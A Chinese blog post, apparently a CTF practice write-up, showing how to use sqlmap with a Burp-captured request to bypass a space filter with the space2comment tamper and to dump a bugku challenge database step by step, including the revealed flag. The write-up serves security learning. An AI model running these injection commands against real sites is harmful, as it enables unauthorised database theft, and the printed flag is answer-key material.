---
layout: post
title: "sqlmap-learning2"
date: 2019-05-20
author: jjnoob
categories:
- 2019-05
tags:
- sqli
- sqlmap
---

* content
{:toc}


# 实验吧连接失败
> 实验吧的题目总是连接失败......


题目[实验吧-简单的sql注入之2](http://www.shiyanbar.com/ctf/1908)

这道题目之前手工注入过.


简单尝试后可以发现过滤空格和`'`.

因为有空格过滤, 所以使用sqlmap的时候得想办法绕过. 

参考这篇文章
[sqlmap的tamper详解](http://www.myh0st.cn/index.php/archives/881/)

可知在`tamper`中:
```
space2comment.py：
用 /**/ 替代空格，用于空格的绕过
```

知道这个就行了.

<br />

# bugku 成绩查询

## (1) 分析
源码:
```php
<h2 style='text-align:center;'>成绩查询</h2>
<form action='index.php' method='post'>
<input style='width:300px;height:40px;font-size:18px;' type='text' name='id' placeholder='1,2,3...'/><br><br><br><br><br>
<input style='width:100px;height:40px;' type='submit' value='Submit'/>
</form>
```


post提交, 需要sqlmap和burp一起用.

输入框随便输一个数, 如`1`. burp抓包, 保存到txt文件.

## (2) sqlmap
### 爆库
```
sqlmap.py -r "C:\Users\18056\Desktop\44.txt" -p id --current-db
```

`-r`: 加载一个文件 
`-p`: 指定参数 (这里是`id`, 原解题网址输入45的时候用burp抓包, 会发现返回`id=45`)


报错:
```
[CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
```

改进, 提高level:
```
sqlmap.py -r "C:\Users\18056\Desktop\44.tx"t -p id --current-db --level=2
```

返回:
```
skctf_flag
current database: 'skctf_flag'
```

### 爆表
```
sqlmap.py -r "C:\Users\18056\Desktop\44.txt" -p id -D skctf_flag --tables --level=2
```

返回:
```
Database: skctf_flag
[2 tables]
+------+
| fl4g |
| sc   |
+------+
```

### 爆字段
flag应该在fl4g表中

```
sqlmap.py -r "C:\Users\18056\Desktop\44.txt" -p id -D skctf_flag -T fl4g --columns --level=2
```

返回:
```
Database: skctf_flag
Table: fl4g
[1 column]
+------------+-------------+
| Column     | Type        |
+------------+-------------+
| skctf_flag | varchar(64) |
+------------+-------------+
```

### 列出字段信息
```
sqlmap.py -r "C:\Users\18056\Desktop\44.txt" -p id -D skctf_flag -T fl4g -C skctf_flag --dump
```

 `-–dump`: 列出字段数据

> 过程非常的慢. 卡住的时候回车一下就会继续进行


返回:
```
Database: skctf_flag
Table: fl4g
[1 entry]
+---------------------------------+
| skctf_flag                      |
+---------------------------------+
| BUGKU{Sql_INJECT0N_4813drd8hz4} |
+---------------------------------+
```
